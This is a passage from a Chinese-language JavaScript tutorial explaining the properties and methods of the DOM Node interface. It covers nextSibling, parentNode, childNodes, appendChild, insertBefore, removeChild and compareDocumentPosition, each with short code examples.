\u6ce8\u610f\uff0c\u8be5\u5c5e\u6027\u8fd8\u5305\u62ec\u6587\u672c\u8282\u70b9\u548c\u6ce8\u91ca\u8282\u70b9\uff08 <!-- comment --> \uff09\u3002\u56e0\u6b64\u5982\u679c\u5f53\u524d\u8282\u70b9\u540e\u9762\u6709\u7a7a\u683c\uff0c\u8be5\u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u5185\u5bb9\u4e3a\u7a7a\u683c\u3002 nextSibling \u5c5e\u6027\u53ef\u4ee5\u7528\u6765\u904d\u5386\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 var el = document . getElementById ( 'div1' ). firstChild ; while ( el !== null ) { console . log ( el . nodeName ); el = el . nextSibling ; } \u4e0a\u9762\u4ee3\u7801\u904d\u5386 div1 \u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 Node.prototype.previousSibling \u00b6 previousSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u524d\u9762\u7684\u3001\u8ddd\u79bb\u6700\u8fd1\u7684\u4e00\u4e2a\u540c\u7ea7\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u524d\u9762\u6ca1\u6709\u540c\u7ea7\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d1\">hello</div><div id=\"d2\">world</div> var d1 = document . getElementById ( 'd1' ); var d2 = document . getElementById ( 'd2' ); d2 . previousSibling === d1 // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c d2.previousSibling \u5c31\u662f d2 \u524d\u9762\u7684\u540c\u7ea7\u8282\u70b9 d1 \u3002 \u6ce8\u610f\uff0c\u8be5\u5c5e\u6027\u8fd8\u5305\u62ec\u6587\u672c\u8282\u70b9\u548c\u6ce8\u91ca\u8282\u70b9\u3002\u56e0\u6b64\u5982\u679c\u5f53\u524d\u8282\u70b9\u524d\u9762\u6709\u7a7a\u683c\uff0c\u8be5\u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a\u6587\u672c\u8282\u70b9\uff0c\u5185\u5bb9\u4e3a\u7a7a\u683c\u3002 Node.prototype.parentNode \u00b6 parentNode \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7236\u8282\u70b9\u3002\u5bf9\u4e8e\u4e00\u4e2a\u8282\u70b9\u6765\u8bf4\uff0c\u5b83\u7684\u7236\u8282\u70b9\u53ea\u53ef\u80fd\u662f\u4e09\u79cd\u7c7b\u578b\uff1a\u5143\u7d20\u8282\u70b9\uff08element\uff09\u3001\u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentfragment\uff09\u3002 1 2 3 if ( node . parentNode ) { node . parentNode . removeChild ( node ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u901a\u8fc7 node.parentNode \u5c5e\u6027\u5c06 node \u8282\u70b9\u4ece\u6587\u6863\u91cc\u9762\u79fb\u9664\u3002 \u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentfragment\uff09\u7684\u7236\u8282\u70b9\u90fd\u662f null \u3002\u53e6\u5916\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u751f\u6210\u540e\u8fd8\u6ca1\u63d2\u5165 DOM \u6811\u7684\u8282\u70b9\uff0c\u7236\u8282\u70b9\u4e5f\u662f null \u3002 Node.prototype.parentElement \u00b6 parentElement \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7236\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u6216\u8005\u7236\u8282\u70b9\u7c7b\u578b\u4e0d\u662f\u5143\u7d20\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 if ( node . parentElement ) { node . parentElement . style . color = 'red' ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7236\u5143\u7d20\u8282\u70b9\u7684\u6837\u5f0f\u8bbe\u5b9a\u4e86\u7ea2\u8272\u3002 \u7531\u4e8e\u7236\u8282\u70b9\u53ea\u53ef\u80fd\u662f\u4e09\u79cd\u7c7b\u578b\uff1a\u5143\u7d20\u8282\u70b9\u3001\u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentfragment\uff09\u3002 parentElement \u5c5e\u6027\u76f8\u5f53\u4e8e\u628a\u540e\u4e24\u79cd\u7236\u8282\u70b9\u90fd\u6392\u9664\u4e86\u3002 Node.prototype.firstChild\uff0cNode.prototype.lastChild \u00b6 firstChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <p id=\"p1\"><span>First span</span></p> var p1 = document . getElementById ( 'p1' ); p1 . firstChild . nodeName // \"SPAN\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u662f span \u5143\u7d20\u3002 \u6ce8\u610f\uff0c firstChild \u8fd4\u56de\u7684\u9664\u4e86\u5143\u7d20\u8282\u70b9\uff0c\u8fd8\u53ef\u80fd\u662f\u6587\u672c\u8282\u70b9\u6216\u6ce8\u91ca\u8282\u70b9\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <p id=\"p1\"> // <span>First span</span> // </p> var p1 = document . getElementById ( 'p1' ); p1 . firstChild . nodeName // \"#text\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5143\u7d20\u4e0e span \u5143\u7d20\u4e4b\u95f4\u6709\u7a7a\u767d\u5b57\u7b26\uff0c\u8fd9\u5bfc\u81f4 firstChild \u8fd4\u56de\u7684\u662f\u6587\u672c\u8282\u70b9\u3002 lastChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5982\u679c\u5f53\u524d\u8282\u70b9\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002\u7528\u6cd5\u4e0e firstChild \u5c5e\u6027\u76f8\u540c\u3002 Node.prototype.childNodes \u00b6 childNodes \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 NodeList \u96c6\u5408\uff09\uff0c\u6210\u5458\u5305\u62ec\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 1 var children = document . querySelector ( 'ul' ). childNodes ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c children \u5c31\u662f ul \u5143\u7d20\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 \u4f7f\u7528\u8be5\u5c5e\u6027\uff0c\u53ef\u4ee5\u904d\u5386\u67d0\u4e2a\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 var div = document . getElementById ( 'div1' ); var children = div . childNodes ; for ( var i = 0 ; i < children . length ; i ++ ) { // ... } \u6587\u6863\u8282\u70b9\uff08document\uff09\u5c31\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff1a\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff08docType\uff09\u548c HTML \u6839\u5143\u7d20\u8282\u70b9\u3002 1 2 3 4 5 6 var children = document . childNodes ; for ( var i = 0 ; i < children . length ; i ++ ) { console . log ( children [ i ]. nodeType ); } // 10 // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6587\u6863\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u7684\u7c7b\u578b\u662f10\uff08\u5373\u6587\u6863\u7c7b\u578b\u8282\u70b9\uff09\uff0c\u7b2c\u4e8c\u4e2a\u5b50\u8282\u70b9\u7684\u7c7b\u578b\u662f1\uff08\u5373\u5143\u7d20\u8282\u70b9\uff09\u3002 \u6ce8\u610f\uff0c\u9664\u4e86\u5143\u7d20\u8282\u70b9\uff0c childNodes \u5c5e\u6027\u7684\u8fd4\u56de\u503c\u8fd8\u5305\u62ec\u6587\u672c\u8282\u70b9\u548c\u6ce8\u91ca\u8282\u70b9\u3002\u5982\u679c\u5f53\u524d\u8282\u70b9\u4e0d\u5305\u62ec\u4efb\u4f55\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684 NodeList \u96c6\u5408\u3002\u7531\u4e8e NodeList \u5bf9\u8c61\u662f\u4e00\u4e2a\u52a8\u6001\u96c6\u5408\uff0c\u4e00\u65e6\u5b50\u8282\u70b9\u53d1\u751f\u53d8\u5316\uff0c\u7acb\u523b\u4f1a\u53cd\u6620\u5728\u8fd4\u56de\u7ed3\u679c\u4e4b\u4e2d\u3002 Node.prototype.isConnected \u00b6 isConnected \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u5426\u5728\u6587\u6863\u4e4b\u4e2d\u3002 1 2 3 4 5 var test = document . createElement ( 'p' ); test . isConnected // false document . body . appendChild ( test ); test . isConnected // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c test \u8282\u70b9\u662f\u811a\u672c\u751f\u6210\u7684\u8282\u70b9\uff0c\u6ca1\u6709\u63d2\u5165\u6587\u6863\u4e4b\u524d\uff0c isConnected \u5c5e\u6027\u8fd4\u56de false \uff0c\u63d2\u5165\u4e4b\u540e\u8fd4\u56de true \u3002 \u65b9\u6cd5 \u00b6 Node.prototype.appendChild() \u00b6 appendChild() \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u8282\u70b9\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5c06\u5176\u4f5c\u4e3a\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u63d2\u5165\u5f53\u524d\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u5c31\u662f\u63d2\u5165\u6587\u6863\u7684\u5b50\u8282\u70b9\u3002 1 2 var p = document . createElement ( 'p' ); document . body . appendChild ( p ); \u4e0a\u9762\u4ee3\u7801\u65b0\u5efa\u4e00\u4e2a <p> \u8282\u70b9\uff0c\u5c06\u5176\u63d2\u5165 document.body \u7684\u5c3e\u90e8\u3002 \u5982\u679c\u53c2\u6570\u8282\u70b9\u662f DOM \u5df2\u7ecf\u5b58\u5728\u7684\u8282\u70b9\uff0c appendChild() \u65b9\u6cd5\u4f1a\u5c06\u5176\u4ece\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u79fb\u52a8\u5230\u65b0\u4f4d\u7f6e\u3002 1 2 var div = document . getElementById ( 'myDiv' ); document . body . appendChild ( div ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u63d2\u5165\u7684\u662f\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u8282\u70b9 myDiv \uff0c\u7ed3\u679c\u5c31\u662f\u8be5\u8282\u70b9\u4f1a\u4ece\u539f\u6765\u7684\u4f4d\u7f6e\uff0c\u79fb\u52a8\u5230 document.body \u7684\u5c3e\u90e8\u3002 \u5982\u679c appendChild() \u65b9\u6cd5\u7684\u53c2\u6570\u662f DocumentFragment \u8282\u70b9\uff0c\u90a3\u4e48\u63d2\u5165\u7684\u662f DocumentFragment \u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u800c\u4e0d\u662f DocumentFragment \u8282\u70b9\u672c\u8eab\u3002\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7a7a\u7684 DocumentFragment \u8282\u70b9\u3002 Node.prototype.hasChildNodes() \u00b6 hasChildNodes \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u5426\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 5 var foo = document . getElementById ( 'foo' ); if ( foo . hasChildNodes ()) { foo . removeChild ( foo . childNodes [ 0 ]); } \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c foo \u8282\u70b9\u6709\u5b50\u8282\u70b9\uff0c\u5c31\u79fb\u9664\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 \u6ce8\u610f\uff0c\u5b50\u8282\u70b9\u5305\u62ec\u6240\u6709\u7c7b\u578b\u7684\u8282\u70b9\uff0c\u5e76\u4e0d\u4ec5\u4ec5\u662f\u5143\u7d20\u8282\u70b9\u3002\u54ea\u6015\u8282\u70b9\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u683c\uff0c hasChildNodes \u65b9\u6cd5\u4e5f\u4f1a\u8fd4\u56de true \u3002 \u5224\u65ad\u4e00\u4e2a\u8282\u70b9\u6709\u6ca1\u6709\u5b50\u8282\u70b9\uff0c\u6709\u8bb8\u591a\u79cd\u65b9\u6cd5\uff0c\u4e0b\u9762\u662f\u5176\u4e2d\u7684\u4e09\u79cd\u3002 node.hasChildNodes() node.firstChild !== null node.childNodes && node.childNodes.length > 0 hasChildNodes \u65b9\u6cd5\u7ed3\u5408 firstChild \u5c5e\u6027\u548c nextSibling \u5c5e\u6027\uff0c\u53ef\u4ee5\u904d\u5386\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 function DOMComb ( parent , callback ) { if ( parent . hasChildNodes ()) { for ( var node = parent . firstChild ; node ; node = node . nextSibling ) { DOMComb ( node , callback ); } } callback ( parent ); } // \u7528\u6cd5 DOMComb ( document . body , console . log ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c DOMComb \u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u67d0\u4e2a\u6307\u5b9a\u7684\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u4e2a\u56de\u8c03\u51fd\u6570\u4f1a\u4f9d\u6b21\u4f5c\u7528\u4e8e\u6307\u5b9a\u8282\u70b9\uff0c\u4ee5\u53ca\u6307\u5b9a\u8282\u70b9\u7684\u6240\u6709\u540e\u4ee3\u8282\u70b9\u3002 Node.prototype.cloneNode() \u00b6 cloneNode \u65b9\u6cd5\u7528\u4e8e\u514b\u9686\u4e00\u4e2a\u8282\u70b9\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u5e03\u5c14\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u662f\u5426\u540c\u65f6\u514b\u9686\u5b50\u8282\u70b9\u3002\u5b83\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u514b\u9686\u51fa\u6765\u7684\u65b0\u8282\u70b9\u3002 1 var cloneUL = document . querySelector ( 'ul' ). cloneNode ( true ); \u8be5\u65b9\u6cd5\u6709\u4e00\u4e9b\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \uff081\uff09\u514b\u9686\u4e00\u4e2a\u8282\u70b9\uff0c\u4f1a\u62f7\u8d1d\u8be5\u8282\u70b9\u7684\u6240\u6709\u5c5e\u6027\uff0c\u4f46\u662f\u4f1a\u4e27\u5931 addEventListener \u65b9\u6cd5\u548c on- \u5c5e\u6027\uff08\u5373 node.onclick = fn \uff09\uff0c\u6dfb\u52a0\u5728\u8fd9\u4e2a\u8282\u70b9\u4e0a\u7684\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u3002 \uff082\uff09\u8be5\u65b9\u6cd5\u8fd4\u56de\u7684\u8282\u70b9\u4e0d\u5728\u6587\u6863\u4e4b\u4e2d\uff0c\u5373\u6ca1\u6709\u4efb\u4f55\u7236\u8282\u70b9\uff0c\u5fc5\u987b\u4f7f\u7528\u8bf8\u5982 Node.appendChild \u8fd9\u6837\u7684\u65b9\u6cd5\u6dfb\u52a0\u5230\u6587\u6863\u4e4b\u4e2d\u3002 \uff083\uff09\u514b\u9686\u4e00\u4e2a\u8282\u70b9\u4e4b\u540e\uff0cDOM \u6709\u53ef\u80fd\u51fa\u73b0\u4e24\u4e2a\u6709\u76f8\u540c id \u5c5e\u6027\uff08\u5373 id=\"xxx\" \uff09\u7684\u7f51\u9875\u5143\u7d20\uff0c\u8fd9\u65f6\u5e94\u8be5\u4fee\u6539\u5176\u4e2d\u4e00\u4e2a\u5143\u7d20\u7684 id \u5c5e\u6027\u3002\u5982\u679c\u539f\u8282\u70b9\u6709 name \u5c5e\u6027\uff0c\u53ef\u80fd\u4e5f\u9700\u8981\u4fee\u6539\u3002 Node.prototype.insertBefore() \u00b6 insertBefore \u65b9\u6cd5\u7528\u4e8e\u5c06\u67d0\u4e2a\u8282\u70b9\u63d2\u5165\u7236\u8282\u70b9\u5185\u90e8\u7684\u6307\u5b9a\u4f4d\u7f6e\u3002 1 var insertedNode = parentNode . insertBefore ( newNode , referenceNode ); insertBefore \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6240\u8981\u63d2\u5165\u7684\u8282\u70b9 newNode \uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7236\u8282\u70b9 parentNode \u5185\u90e8\u7684\u4e00\u4e2a\u5b50\u8282\u70b9 referenceNode \u3002 newNode \u5c06\u63d2\u5728 referenceNode \u8fd9\u4e2a\u5b50\u8282\u70b9\u7684\u524d\u9762\u3002\u8fd4\u56de\u503c\u662f\u63d2\u5165\u7684\u65b0\u8282\u70b9 newNode \u3002 1 2 var p = document . createElement ( 'p' ); document . body . insertBefore ( p , document . body . firstChild ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u65b0\u5efa\u4e00\u4e2a <p> \u8282\u70b9\uff0c\u63d2\u5728 document.body.firstChild \u7684\u524d\u9762\uff0c\u4e5f\u5c31\u662f\u6210\u4e3a document.body \u7684\u7b2c\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 \u5982\u679c insertBefore \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a null \uff0c\u5219\u65b0\u8282\u70b9\u5c06\u63d2\u5728\u5f53\u524d\u8282\u70b9\u5185\u90e8\u7684\u6700\u540e\u4f4d\u7f6e\uff0c\u5373\u53d8\u6210\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 1 2 var p = document . createElement ( 'p' ); document . body . insertBefore ( p , null ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c p \u5c06\u6210\u4e3a document.body \u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\u3002\u8fd9\u4e5f\u8bf4\u660e insertBefore \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e0d\u80fd\u7701\u7565\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u6240\u8981\u63d2\u5165\u7684\u8282\u70b9\u662f\u5f53\u524d DOM \u73b0\u6709\u7684\u8282\u70b9\uff0c\u5219\u8be5\u8282\u70b9\u5c06\u4ece\u539f\u6709\u7684\u4f4d\u7f6e\u79fb\u9664\uff0c\u63d2\u5165\u65b0\u7684\u4f4d\u7f6e\u3002 \u7531\u4e8e\u4e0d\u5b58\u5728 insertAfter \u65b9\u6cd5\uff0c\u5982\u679c\u65b0\u8282\u70b9\u8981\u63d2\u5728\u7236\u8282\u70b9\u7684\u67d0\u4e2a\u5b50\u8282\u70b9\u540e\u9762\uff0c\u53ef\u4ee5\u7528 insertBefore \u65b9\u6cd5\u7ed3\u5408 nextSibling \u5c5e\u6027\u6a21\u62df\u3002 1 parent . insertBefore ( s1 , s2 . nextSibling ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c parent \u662f\u7236\u8282\u70b9\uff0c s1 \u662f\u4e00\u4e2a\u5168\u65b0\u7684\u8282\u70b9\uff0c s2 \u662f\u53ef\u4ee5\u5c06 s1 \u8282\u70b9\uff0c\u63d2\u5728 s2 \u8282\u70b9\u7684\u540e\u9762\u3002\u5982\u679c s2 \u662f\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u5219 s2.nextSibling \u8fd4\u56de null \uff0c\u8fd9\u65f6 s1 \u8282\u70b9\u4f1a\u63d2\u5728\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\uff0c\u53d8\u6210\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u7b49\u4e8e\u7d27\u8ddf\u5728 s2 \u7684\u540e\u9762\u3002 \u5982\u679c\u8981\u63d2\u5165\u7684\u8282\u70b9\u662f DocumentFragment \u7c7b\u578b\uff0c\u90a3\u4e48\u63d2\u5165\u7684\u5c06\u662f DocumentFragment \u7684\u6240\u6709\u5b50\u8282\u70b9\uff0c\u800c\u4e0d\u662f DocumentFragment \u8282\u70b9\u672c\u8eab\u3002\u8fd4\u56de\u503c\u5c06\u662f\u4e00\u4e2a\u7a7a\u7684 DocumentFragment \u8282\u70b9\u3002 Node.prototype.removeChild() \u00b6 removeChild \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5b50\u8282\u70b9\u4f5c\u4e3a\u53c2\u6570\uff0c\u7528\u4e8e\u4ece\u5f53\u524d\u8282\u70b9\u79fb\u9664\u8be5\u5b50\u8282\u70b9\u3002\u8fd4\u56de\u503c\u662f\u79fb\u9664\u7684\u5b50\u8282\u70b9\u3002 1 2 var divA = document . getElementById ( 'A' ); divA . parentNode . removeChild ( divA ); \u4e0a\u9762\u4ee3\u7801\u79fb\u9664\u4e86 divA \u8282\u70b9\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5728 divA \u7684\u7236\u8282\u70b9\u4e0a\u8c03\u7528\u7684\uff0c\u4e0d\u662f\u5728 divA \u4e0a\u8c03\u7528\u7684\u3002 \u4e0b\u9762\u662f\u5982\u4f55\u79fb\u9664\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u3002 1 2 3 4 var element = document . getElementById ( 'top' ); while ( element . firstChild ) { element . removeChild ( element . firstChild ); } \u88ab\u79fb\u9664\u7684\u8282\u70b9\u4f9d\u7136\u5b58\u5728\u4e8e\u5185\u5b58\u4e4b\u4e2d\uff0c\u4f46\u4e0d\u518d\u662f DOM \u7684\u4e00\u90e8\u5206\u3002\u6240\u4ee5\uff0c\u4e00\u4e2a\u8282\u70b9\u79fb\u9664\u4ee5\u540e\uff0c\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528\u5b83\uff0c\u6bd4\u5982\u63d2\u5165\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\u4e0b\u9762\u3002 \u5982\u679c\u53c2\u6570\u8282\u70b9\u4e0d\u662f\u5f53\u524d\u8282\u70b9\u7684\u5b50\u8282\u70b9\uff0c removeChild \u65b9\u6cd5\u5c06\u62a5\u9519\u3002 Node.prototype.replaceChild() \u00b6 replaceChild \u65b9\u6cd5\u7528\u4e8e\u5c06\u4e00\u4e2a\u65b0\u7684\u8282\u70b9\uff0c\u66ff\u6362\u5f53\u524d\u8282\u70b9\u7684\u67d0\u4e00\u4e2a\u5b50\u8282\u70b9\u3002 1 var replacedNode = parentNode . replaceChild ( newChild , oldChild ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c replaceChild \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 newChild \u662f\u7528\u6765\u66ff\u6362\u7684\u65b0\u8282\u70b9\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570 oldChild \u662f\u5c06\u8981\u66ff\u6362\u8d70\u7684\u5b50\u8282\u70b9\u3002\u8fd4\u56de\u503c\u662f\u66ff\u6362\u8d70\u7684\u90a3\u4e2a\u8282\u70b9 oldChild \u3002 1 2 3 4 var divA = document . getElementById ( 'divA' ); var newSpan = document . createElement ( 'span' ); newSpan . textContent = 'Hello World!' ; divA . parentNode . replaceChild ( newSpan , divA ); \u4e0a\u9762\u4ee3\u7801\u662f\u5982\u4f55\u5c06\u6307\u5b9a\u8282\u70b9 divA \u66ff\u6362\u8d70\u3002 Node.prototype.contains() \u00b6 contains \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u53c2\u6570\u8282\u70b9\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u4e09\u4e2a\u6761\u4ef6\u4e4b\u4e00\u3002 \u53c2\u6570\u8282\u70b9\u4e3a\u5f53\u524d\u8282\u70b9\u3002 \u53c2\u6570\u8282\u70b9\u4e3a\u5f53\u524d\u8282\u70b9\u7684\u5b50\u8282\u70b9\u3002 \u53c2\u6570\u8282\u70b9\u4e3a\u5f53\u524d\u8282\u70b9\u7684\u540e\u4ee3\u8282\u70b9\u3002 1 document . body . contains ( node ) \u4e0a\u9762\u4ee3\u7801\u68c0\u67e5\u53c2\u6570\u8282\u70b9 node \uff0c\u662f\u5426\u5305\u542b\u5728\u5f53\u524d\u6587\u6863\u4e4b\u4e2d\u3002 \u6ce8\u610f\uff0c\u5f53\u524d\u8282\u70b9\u4f20\u5165 contains \u65b9\u6cd5\uff0c\u8fd4\u56de true \u3002 1 nodeA . contains ( nodeA ) // true Node.prototype.compareDocumentPosition() \u00b6 compareDocumentPosition \u65b9\u6cd5\u7684\u7528\u6cd5\uff0c\u4e0e contains \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\uff0c\u8fd4\u56de\u4e00\u4e2a\u516d\u4e2a\u6bd4\u7279\u4f4d\u7684\u4e8c\u8fdb\u5236\u503c\uff0c\u8868\u793a\u53c2\u6570\u8282\u70b9\u4e0e\u5f53\u524d\u8282\u70b9\u7684\u5173\u7cfb\u3002 \u4e8c\u8fdb\u5236\u503c \u5341\u8fdb\u5236\u503c \u542b\u4e49 000000 0 \u4e24\u4e2a\u8282\u70b9\u76f8\u540c 000001 1 \u4e24\u4e2a\u8282\u70b9\u4e0d\u5728\u540c\u4e00\u4e2a\u6587\u6863\uff08\u5373\u6709\u4e00\u4e2a\u8282\u70b9\u4e0d\u5728\u5f53\u524d\u6587\u6863\uff09 000010 2 \u53c2\u6570\u8282\u70b9\u5728\u5f53\u524d\u8282\u70b9\u7684\u524d\u9762 000100 4 \u53c2\u6570\u8282\u70b9\u5728\u5f53\u524d\u8282\u70b9\u7684\u540e\u9762 001000 8 \u53c2\u6570\u8282\u70b9\u5305\u542b\u5f53\u524d\u8282\u70b9 010000 16 \u5f53\u524d\u8282\u70b9\u5305\u542b\u53c2\u6570\u8282\u70b9 100000 32 \u6d4f\u89c8\u5668\u5185\u90e8\u4f7f\u7528 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"mydiv\"> // <form><input id=\"test\" /></form> // </div> var div = document . getElementById ( 'mydiv' ); var input = document . getElementById ( 'test' ); div . compareDocumentPosition ( input ) // 20 input . compareDocumentPosition ( div ) // 10 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8282\u70b9 div \u5305\u542b\u8282\u70b9 input \uff08\u4e8c\u8fdb\u5236 010000 \uff09\uff0c\u800c\u4e14\u8282\u70b9 input \u5728\u8282\u70b9 div \u7684\u540e\u9762\uff08\u4e8c\u8fdb\u5236 000100 \uff09\uff0c\u6240\u4ee5\u7b2c\u4e00\u4e2a compareDocumentPosition \u65b9\u6cd5\u8fd4\u56de 20 \uff08\u4e8c\u8fdb\u5236 010100 \uff0c\u5373 010000 + 000100 \uff09\uff0c\u7b2c\u4e8c\u4e2a compareDocumentPosition \u65b9\u6cd5\u8fd4\u56de 10 \uff08\u4e8c\u8fdb\u5236 001010 \uff09\u3002 \u7531\u4e8e compareDocumentPosition \u8fd4\u56de\u503c\u7684\u542b\u4e49\uff0c\u5b9a\u4e49\u5728\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u4e0a\uff0c\u6240\u4ee5\u5982\u679c\u8981\u68c0\u67e5\u67d0\u4e00\u79cd\u7279\u5b9a\u7684\u542b\u4e49\uff0c\u5c31\u9700\u8981\u4f7f\u7528\u6bd4\u7279\u4f4d\u8fd0\u7b97\u7b26\u3002 1 2 3 4 5 6 7 var head = document . head ; var body = document . body ; if ( head . compareDocumentPosition ( body ) & 4 ) { console . log ( '\u6587\u6863\u7ed3\u6784\u6b63\u786e' ); } else { console . log ( '<body> \u4e0d\u80fd\u5728 <head> \u524d\u9762' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c compareDocumentPosition \u7684\u8fd4\u56de\u503c\u4e0e 4 \uff08\u53c8\u79f0\u63a9\u7801\uff09\u8fdb\u884c\u4e0e\u8fd0\u7b97\uff08 & \uff09\uff0c\u5f97\u5230\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a <head> \u662f\u5426\u5728 <body> 